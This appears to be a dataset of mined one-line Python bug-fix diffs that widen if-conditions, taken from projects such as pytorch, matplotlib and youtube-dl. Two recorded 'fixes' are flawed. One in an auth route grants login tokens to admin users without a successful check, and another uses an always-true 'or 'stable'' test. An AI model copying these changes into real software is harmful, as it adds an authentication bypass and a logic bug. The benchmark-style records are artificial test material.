{"project": "revizor-tests", "commit_sha": "db04876717a6655c7bd20baaa4e70ee714cae2bb", "parent_sha": "5cd88759a90856051e175f45a03fb4a6efa71a34", "file_path": "functional/terrain/libs/common.py", "project_url": "https://github.com/Scalr/revizor-tests", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,7 +50,7 @@ def run_only_if(*args, **kwargs):\n                '!=': operator.ne,\n                '>': operator.gt,\n                '>=': operator.ge}\n-        if CONF.feature.branch == 'latest':\n+        if CONF.feature.branch == 'latest' or 'stable':\n             web_content = requests.get('http://stridercd.scalr-labs.com/scalarizr/apt-plain/release/%s/' %\n                                        CONF.feature.branch).text.splitlines()\n         else:\n", "before": "if CONF . feature . branch == 'latest' : web_content = requests . get ( 'http://stridercd.scalr-labs.com/scalarizr/apt-plain/release/%s/' % CONF . feature . branch ) . text . splitlines ( ) else : ", "after": "if CONF . feature . branch == 'latest' or 'stable' : web_content = requests . get ( 'http://stridercd.scalr-labs.com/scalarizr/apt-plain/release/%s/' % CONF . feature . branch ) . text . splitlines ( ) else : ", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 14], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 43], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:'stable'\", \"T\"], 2]]"}
{"project": "searx", "commit_sha": "413e143707f9b573d8740cae92152e54df8fdfcd", "parent_sha": "104cdb7d03771d4eca5b5126532ccf47642bb9de", "file_path": "searx/results.py", "project_url": "https://github.com/MarcAbonce/searx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -28,7 +28,7 @@ def compare_urls(url_a, url_b):\n     else:\n         host_b = url_b.netloc\n \n-    if host_a != host_b or url_a.query != url_b.query:\n+    if host_a != host_b or url_a.query != url_b.query or url_a.fragment != url_b.fragment:\n         return False\n \n     # remove / from the end of the url if required\n", "before": "if host_a != host_b or url_a . query != url_b . query : return False", "after": "if host_a != host_b or url_a . query != url_b . query or url_a . fragment != url_b . fragment : return False", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 8, 3, 54], [\"boolean_operator\", 3, 8, 3, 54], 0], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 54], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 54], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N0\", [\"attribute\", \"N2\"], 2], [\"Insert\", \"N1\", [\"identifier:url_a\", \"T\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:fragment\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:url_b\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:fragment\", \"T\"], 2]]"}
{"project": "matplotlib", "commit_sha": "ec118325900849d76f823c9a9b8d595db4ca883f", "parent_sha": "6ed9211956f6b098d5821b0bd5695fa135d8ee32", "file_path": "setupext.py", "project_url": "https://github.com/story645/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -937,7 +937,7 @@ class FreeType(SetupPackage):\n \n         # Early versions of freetype grep badly inside freetype-config,\n         # so catch those cases. (tested with 2.5.3).\n-        if 'No such file or directory\\ngrep:' in version:\n+        if version is None or 'No such file or directory\\ngrep:' in version:\n             version = self.version_from_header()\n \n         return self._check_for_pkg_config(\n", "before": "if 'No such file or directory\\ngrep:' in version : version = self . version_from_header ( )", "after": "if version is None or 'No such file or directory\\ngrep:' in version : version = self . version_from_header ( )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 49], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 57], 2], [\"Insert\", \"N1\", [\"identifier:version\", \"T\"], 0], [\"Insert\", \"N1\", [\"is:is\", \"T\"], 1], [\"Insert\", \"N1\", [\"none:None\", \"T\"], 2]]"}
{"project": "pytorch", "commit_sha": "638b10d39bb5e1a62f4cf9dfd577654f8663810a", "parent_sha": "165d0897e4b54a83b026bf5109cbf688497a8199", "file_path": "torch/nn/functional.py", "project_url": "https://github.com/ezyang/pytorch", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -768,7 +768,7 @@ softplus(input, beta=1, threshold=20) -> Variable\n def _get_softmax_dim(name, ndim, stacklevel):\n     warnings.warn(\"Implicit dimension choice for \" + name + \" has been deprecated. \"\n                   \"Change the call to include dim=X as an argument.\", stacklevel=stacklevel)\n-    if ndim == 0 or ndim == 3:\n+    if ndim == 0 or ndim == 1 or ndim == 3:\n         return 0\n     else:\n         return 1\n", "before": "if ndim == 0 or ndim == 3 : return 0 else : return 1", "after": "if ndim == 0 or ndim == 1 or ndim == 3 : return 0 else : return 1", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"boolean_operator\", 3, 8, 3, 30], [\"boolean_operator\", \"N0\"], 0], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 30], [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 8, 3, 17], 0], [\"Move\", \"N0\", [\"or:or\", 3, 18, 3, 20], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:ndim\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:1\", \"T\"], 2]]"}
{"project": "iterative-Random-Forest", "commit_sha": "3084d7be327f6d2f0fbb1215ec95c58c5e9ee535", "parent_sha": "53788b0cb57a45ce8995a48d6b646beb4d133ffe", "file_path": "sklearn/cluster/tests/test_k_means.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -217,7 +217,7 @@ def _has_blas_lib(libname):\n \n \n def test_k_means_plus_plus_init_2_jobs():\n-    if _is_mac_os_version('10.7'):\n+    if _is_mac_os_version('10.7') or _is_mac_os_version('10.8'):\n         raise SkipTest('Multi-process bug in Mac OS X Lion (see issue #636)')\n \n     if _has_blas_lib('openblas'):\n", "before": "if _is_mac_os_version ( '10.7' ) : raise SkipTest ( 'Multi-process bug in Mac OS X Lion (see issue #636)' )", "after": "if _is_mac_os_version ( '10.7' ) or _is_mac_os_version ( '10.8' ) : raise SkipTest ( 'Multi-process bug in Mac OS X Lion (see issue #636)' )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 5, 4, 78], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 8, 3, 34], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:_is_mac_os_version\", \"T\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'10.8'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2]]"}
{"project": "cpymad", "commit_sha": "affd2acf54f4c11ec2475102898d5cfc8c11c158", "parent_sha": "134e37d149e109be3171815b60ecfce9ad91c93e", "file_path": "cpymad/util.py", "project_url": "https://github.com/hibtc/cpymad", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -85,7 +85,7 @@ def name_from_internal(element_name):\n     except AttributeError:\n         raise ValueError(\"Not a valid MAD-X element name: {!r}\"\n                          .format(element_name))\n-    if count is None or count == ':1':\n+    if count is None or count == ':1' or count == ':0':\n         return name\n     return name + '[' + count[1:] + ']'\n \n", "before": "if count is None or count == ':1' : return name", "after": "if count is None or count == ':1' or count == ':0' : return name", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 8, 3, 38], [\"boolean_operator\", 3, 8, 3, 38], 0], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 38], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 8, 3, 38], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:count\", \"T\"], 0], [\"Insert\", \"N0\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N0\", [\"string:':0'\", \"T\"], 2]]"}
{"project": "encore", "commit_sha": "d52909d07eb081bb30df7e658a4f6a963fdaf136", "parent_sha": "78635727c0bc48a2bb4fbe4a74522bd397fe82d2", "file_path": "encore/storage/dynamic_url_store.py", "project_url": "https://github.com/enthought/encore", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -57,7 +57,7 @@ class RequestsURLValue(Value):\n     def _validate_response(self, response):\n         if response.status_code == 404:\n             raise KeyError(self._key)\n-        elif response.status_code == 403:\n+        elif response.status_code == 403 or response.status_code == 401:\n             raise AuthorizationError(self._key)\n         response.raise_for_status()\n \n", "before": "if response . status_code == 404 : raise KeyError ( self . _key ) elif response . status_code == 403 : raise AuthorizationError ( self . _key )", "after": "if response . status_code == 404 : raise KeyError ( self . _key ) elif response . status_code == 403 or response . status_code == 401 : raise AuthorizationError ( self . _key )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"elif_clause\", 3, 9, 4, 48], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 14, 3, 41], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:401\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:response\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:status_code\", \"T\"], 2]]"}
{"project": "pyfluent", "commit_sha": "a66a3fcf417a4848bbf549d92bb364507b27404a", "parent_sha": "5c6a56bd92af3743dddd7506e592d72909360bd5", "file_path": "tests/test_logging.py", "project_url": "https://github.com/yosisa/pyfluent", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -145,7 +145,7 @@ class TestFluentFormatter(object):\n         }\n         if sys.version_info[:3] >= (3, 2, 0):\n             expected['stack_info'] = None\n-        if sys.version_info[:3] < (2, 6, 0):\n+        if sys.version_info[:3] < (2, 6, 0) or sys.version_info[:2] == (3, 0):\n             del expected['processName']\n         assert fmt.format(record) == expected\n \n", "before": "if sys . version_info [ : 3 ] < ( 2 , 6 , 0 ) : del expected [ 'processName' ]", "after": "if sys . version_info [ : 3 ] < ( 2 , 6 , 0 ) or sys . version_info [ : 2 ] == ( 3 , 0 ) : del expected [ 'processName' ]", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 40], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", [\"if_statement\", 3, 9, 4, 40], [\":::\", \"T\"], 2], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 44], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"tuple\", \"N3\"], 2], [\"Insert\", \"N2\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"slice\", \"N5\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"integer:3\", \"T\"], 1], [\"Insert\", \"N3\", [\",:,\", \"T\"], 2], [\"Insert\", \"N3\", [\"integer:0\", \"T\"], 3], [\"Insert\", \"N3\", [\"):)\", \"T\"], 4], [\"Insert\", \"N4\", [\"identifier:sys\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:version_info\", \"T\"], 2], [\"Move\", \"N5\", [\":::\", 3, 44, 3, 45], 0], [\"Insert\", \"N5\", [\"integer:2\", \"T\"], 1]]"}
{"project": "bitcoin-arbitrage", "commit_sha": "ad3365574f2eddfe564843493239d683c3fb5878", "parent_sha": "6d1464934008225c789b527c76aa2493d08f72d2", "file_path": "src/arbitrage.py", "project_url": "https://github.com/Blizzard-/bitcoin-arbitrage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -61,7 +61,7 @@ class Arbitrer(object):\n             if amount < 0:\n                 break\n             sell_total += amount\n-            if w_sellprice == 0:\n+            if w_sellprice == 0 or sell_total == 0:\n                 w_sellprice = price\n             else:\n                 w_sellprice = (w_sellprice * (sell_total - amount) + price * amount) / sell_total\n", "before": "if w_sellprice == 0 : w_sellprice = price else : w_sellprice = ( w_sellprice * ( sell_total - amount ) + price * amount ) / sell_total", "after": "if w_sellprice == 0 or sell_total == 0 : w_sellprice = price else : w_sellprice = ( w_sellprice * ( sell_total - amount ) + price * amount ) / sell_total", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 13, 6, 98], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 16, 3, 32], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:sell_total\", \"T\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2]]"}
{"project": "waf-stage", "commit_sha": "2baaf7839403d95dbdeab092b124d06b31e05902", "parent_sha": "c1a0bc1f3b0c271d7b30f52bdca29397c584becc", "file_path": "waflib/Runner.py", "project_url": "https://github.com/Rob3rtS/waf-stage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -317,7 +317,7 @@ class Parallel(object):\n \t\t\t\t\ttsk.hasrun = Task.SKIPPED\n \t\t\t\t\tif self.bld.keep == 1:\n \t\t\t\t\t\t# if -k stop at the first exception, if -kk try to go as far as possible\n-\t\t\t\t\t\tif Logs.verbose:\n+\t\t\t\t\t\tif Logs.verbose or not self.error:\n \t\t\t\t\t\t\tself.error.append(tsk)\n \t\t\t\t\t\tself.stop = True\n \t\t\t\t\tcontinue\n", "before": "if Logs . verbose : self . error . append ( tsk )", "after": "if Logs . verbose or not self . error : self . error . append ( tsk )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 7, 4, 30], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"attribute\", 3, 10, 3, 22], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"not_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"not:not\", \"T\"], 0], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 1], [\"Insert\", \"N2\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:error\", \"T\"], 2]]"}
{"project": "TWBlue", "commit_sha": "07bb6930d031b0513c8a2d9dcfc102766312aa93", "parent_sha": "d1fe610d6e190e7b3603964ef8dea32e3f1b22a9", "file_path": "src/controller/settings.py", "project_url": "https://github.com/TWBlueQS/TWBlue", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -157,7 +157,7 @@ class accountSettingsController(globalSettingsController):\n   else:\n    self.config[\"general\"][\"retweet_mode\"] = \"comment\"\n   buffers_list = self.dialog.buffers.get_list()\n-  if set(self.config[\"general\"][\"buffer_order\"]) != set(buffers_list):\n+  if set(self.config[\"general\"][\"buffer_order\"]) != set(buffers_list) or buffers_list != self.config[\"general\"][\"buffer_order\"]:\n    self.needs_restart = True\n    self.config[\"general\"][\"buffer_order\"] = buffers_list\n \n", "before": "if set ( self . config [ \"general\" ] [ \"buffer_order\" ] ) != set ( buffers_list ) : self . needs_restart = True self . config [ \"general\" ] [ \"buffer_order\" ] = buffers_list", "after": "if set ( self . config [ \"general\" ] [ \"buffer_order\" ] ) != set ( buffers_list ) or buffers_list != self . config [ \"general\" ] [ \"buffer_order\" ] : self . needs_restart = True self . config [ \"general\" ] [ \"buffer_order\" ] = buffers_list", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 3, 5, 57], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 6, 3, 70], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"identifier:buffers_list\", \"T\"], 0], [\"Insert\", \"N1\", [\"!=:!=\", \"T\"], 1], [\"Insert\", \"N1\", [\"subscript\", \"N2\"], 2], [\"Insert\", \"N2\", [\"subscript\", \"N3\"], 0], [\"Insert\", \"N2\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N2\", [\"string:\\\"buffer_order\\\"\", \"T\"], 2], [\"Insert\", \"N2\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 0], [\"Insert\", \"N3\", [\"[:[\", \"T\"], 1], [\"Insert\", \"N3\", [\"string:\\\"general\\\"\", \"T\"], 2], [\"Insert\", \"N3\", [\"]:]\", \"T\"], 3], [\"Insert\", \"N4\", [\"identifier:self\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:config\", \"T\"], 2]]"}
{"project": "waf-stage", "commit_sha": "4953daf3d4dbf01924523eaa79377e569495b027", "parent_sha": "7b6c4e2c9de3247895d945b3e0beb0518c2713be", "file_path": "waflib/Options.py", "project_url": "https://github.com/Rob3rtS/waf-stage", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -98,7 +98,7 @@ class opt_parser(optparse.OptionParser):\n \t\tcmds_str = {}\n \t\tfor cls in Context.classes:\n-\t\t\tif not cls.cmd or cls.cmd == 'options':\n+\t\t\tif not cls.cmd or cls.cmd == 'options' or cls.cmd.startswith( '_' ):\n \t\t\t\tcontinue\n \n \t\t\ts = cls.__doc__ or ''\n", "before": "if not cls . cmd or cls . cmd == 'options' : continue", "after": "if not cls . cmd or cls . cmd == 'options' or cls . cmd . startswith ( '_' ) : continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 2, 11, 2, 42], [\"boolean_operator\", 2, 11, 2, 42], 0], [\"Insert\", [\"boolean_operator\", 2, 11, 2, 42], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 2, 11, 2, 42], [\"call\", \"N0\"], 2], [\"Insert\", \"N0\", [\"attribute\", \"N1\"], 0], [\"Insert\", \"N0\", [\"argument_list\", \"N2\"], 1], [\"Insert\", \"N1\", [\"attribute\", \"N3\"], 0], [\"Insert\", \"N1\", [\".:.\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:startswith\", \"T\"], 2], [\"Insert\", \"N2\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N2\", [\"string:'_'\", \"T\"], 1], [\"Insert\", \"N2\", [\"):)\", \"T\"], 2], [\"Insert\", \"N3\", [\"identifier:cls\", \"T\"], 0], [\"Insert\", \"N3\", [\".:.\", \"T\"], 1], [\"Insert\", \"N3\", [\"identifier:cmd\", \"T\"], 2]]"}
{"project": "youtube-dl", "commit_sha": "00eb865b3c8002f47e73706b54f58feaee0b0ac2", "parent_sha": "2f1983572659415354c88743130a303af8188caf", "file_path": "youtube_dl/extractor/youtube.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1930,7 +1930,7 @@ class YoutubeIE(YoutubeBaseInfoExtractor):\n                 }\n \n             for fmt in streaming_formats:\n-                if fmt.get('drm_families'):\n+                if fmt.get('drmFamilies') or fmt.get('drm_families'):\n                     continue\n                 url = url_or_none(fmt.get('url'))\n \n", "before": "if fmt . get ( 'drm_families' ) : continue", "after": "if fmt . get ( 'drmFamilies' ) or fmt . get ( 'drm_families' ) : continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 17, 4, 29], [\"boolean_operator\", \"N0\"], 1], [\"Insert\", \"N0\", [\"call\", \"N1\"], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Move\", \"N0\", [\"call\", 3, 20, 3, 43], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N2\", [\"identifier:fmt\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:get\", \"T\"], 2], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"string:'drmFamilies'\", \"T\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2]]"}
{"project": "youtube-dl", "commit_sha": "522d6b5c961f584055463f8c69de864ec075083b", "parent_sha": "3c92fd1cd5b5ced11f03ebe64104457c21cd69ec", "file_path": "youtube_dl/extractor/cbs.py", "project_url": "https://github.com/ozburo/youtube-dl", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -65,7 +65,7 @@ class CBSIE(CBSBaseIE):\n         last_e = None\n         for item in items_data.findall('.//item'):\n             asset_type = xpath_text(item, 'assetType')\n-            if not asset_type or asset_type in asset_types:\n+            if not asset_type or asset_type in asset_types or asset_type in ('HLS_FPS', 'DASH_CENC'):\n                 continue\n             asset_types.append(asset_type)\n             query = {\n", "before": "if not asset_type or asset_type in asset_types : continue", "after": "if not asset_type or asset_type in asset_types or asset_type in ( 'HLS_FPS' , 'DASH_CENC' ) : continue", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Move\", [\"boolean_operator\", 3, 20, 3, 59], [\"boolean_operator\", 3, 20, 3, 59], 0], [\"Insert\", [\"boolean_operator\", 3, 20, 3, 59], [\"or:or\", \"T\"], 1], [\"Insert\", [\"boolean_operator\", 3, 20, 3, 59], [\"comparison_operator\", \"N0\"], 2], [\"Insert\", \"N0\", [\"identifier:asset_type\", \"T\"], 0], [\"Insert\", \"N0\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N0\", [\"tuple\", \"N1\"], 2], [\"Insert\", \"N1\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N1\", [\"string:'HLS_FPS'\", \"T\"], 1], [\"Insert\", \"N1\", [\",:,\", \"T\"], 2], [\"Insert\", \"N1\", [\"string:'DASH_CENC'\", \"T\"], 3], [\"Insert\", \"N1\", [\"):)\", \"T\"], 4]]"}
{"project": "TWBlue", "commit_sha": "695b35031efaf58e18177a6a126044c1ab975509", "parent_sha": "f9d869e824ff7088c4143401c569da4442f95cc6", "file_path": "src/controller/buffersController.py", "project_url": "https://github.com/TWBlueQS/TWBlue", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -141,7 +141,7 @@ class bufferController(object):\n      text = twishort.create_tweet(self.session.settings[\"twitter\"][\"user_key\"], self.session.settings[\"twitter\"][\"user_secret\"], text)\n     else:\n      text = twishort.create_tweet(self.session.settings[\"twitter\"][\"user_key\"], self.session.settings[\"twitter\"][\"user_secret\"], text, 1)\n-   if not hasattr(tweet, \"attachments\"):\n+   if not hasattr(tweet, \"attachments\") or len(tweet.attachments) == 0:\n     call_threaded(self.session.api_call, call_name=\"update_status\", status=text)\n    else:\n     call_threaded(self.post_with_media, text=text, attachments=tweet.attachments)\n", "before": "if not hasattr ( tweet , \"attachments\" ) : call_threaded ( self . session . api_call , call_name = \"update_status\" , status = text ) else : call_threaded ( self . post_with_media , text = text , attachments = tweet . attachments )", "after": "if not hasattr ( tweet , \"attachments\" ) or len ( tweet . attachments ) == 0 : call_threaded ( self . session . api_call , call_name = \"update_status\" , status = text ) else : call_threaded ( self . post_with_media , text = text , attachments = tweet . attachments )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"not_operator\", 3, 7, 3, 40], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"call\", 3, 11, 3, 40], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"call\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"integer:0\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:len\", \"T\"], 0], [\"Insert\", \"N2\", [\"argument_list\", \"N3\"], 1], [\"Insert\", \"N3\", [\"(:(\", \"T\"], 0], [\"Insert\", \"N3\", [\"attribute\", \"N4\"], 1], [\"Insert\", \"N3\", [\"):)\", \"T\"], 2], [\"Insert\", \"N4\", [\"identifier:tweet\", \"T\"], 0], [\"Insert\", \"N4\", [\".:.\", \"T\"], 1], [\"Insert\", \"N4\", [\"identifier:attachments\", \"T\"], 2]]"}
{"project": "backend", "commit_sha": "98da77aa256b6ed405d2392f9ba6f343a0f2efe3", "parent_sha": "ed3a2f3cc1b0e36e82db7acc57e1c3d5568919db", "file_path": "api/routes/auth.py", "project_url": "https://github.com/Sakuten/backend", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -45,7 +45,7 @@ def home():\n                 f'Skipping request from {request.remote_addr}')\n             success = True\n \n-        if success:\n+        if success or user.authority == 'admin':\n             token = generate_token({'user_id': user.id})\n             return jsonify({\"message\": \"Login Successful\",\n                             \"token\": token.decode()})\n", "before": "if success : token = generate_token ( { 'user_id' : user . id } ) return jsonify ( { \"message\" : \"Login Successful\" , \"token\" : token . decode ( ) } )", "after": "if success or user . authority == 'admin' : token = generate_token ( { 'user_id' : user . id } ) return jsonify ( { \"message\" : \"Login Successful\" , \"token\" : token . decode ( ) } )", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 6, 54], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:success\", 3, 12, 3, 19], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"attribute\", \"N2\"], 0], [\"Insert\", \"N1\", [\"==:==\", \"T\"], 1], [\"Insert\", \"N1\", [\"string:'admin'\", \"T\"], 2], [\"Insert\", \"N2\", [\"identifier:user\", \"T\"], 0], [\"Insert\", \"N2\", [\".:.\", \"T\"], 1], [\"Insert\", \"N2\", [\"identifier:authority\", \"T\"], 2]]"}
{"project": "intelmq", "commit_sha": "cf49d95a2cb9be3499a90ec826fcbf3584dcfd59", "parent_sha": "07763a349cdad985eebd2be1d5625b45d1fc377d", "file_path": "intelmq/lib/bot.py", "project_url": "https://github.com/kbrajneesh/intelmq", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -437,7 +437,7 @@ def __load_pipeline_configuration(self):\n                              \"{!r}.\".format(self.__bot_id))\n \n     def __log_configuration_parameter(self, config_name, option, value):\n-        if \"password\" in option:\n+        if \"password\" in option or \"token\" in option:\n             value = \"HIDDEN\"\n \n         message = \"{} configuration: parameter {!r} loaded with value {!r}.\"\\\n", "before": "if \"password\" in option : value = \"HIDDEN\"", "after": "if \"password\" in option or \"token\" in option : value = \"HIDDEN\"", "sstub_pattern": "LESS_SPECIFIC_IF", "edit_script": "[[\"Insert\", [\"if_statement\", 3, 9, 4, 29], [\"boolean_operator\", \"N0\"], 1], [\"Move\", \"N0\", [\"comparison_operator\", 3, 12, 3, 32], 0], [\"Insert\", \"N0\", [\"or:or\", \"T\"], 1], [\"Insert\", \"N0\", [\"comparison_operator\", \"N1\"], 2], [\"Insert\", \"N1\", [\"string:\\\"token\\\"\", \"T\"], 0], [\"Insert\", \"N1\", [\"in:in\", \"T\"], 1], [\"Insert\", \"N1\", [\"identifier:option\", \"T\"], 2]]"}
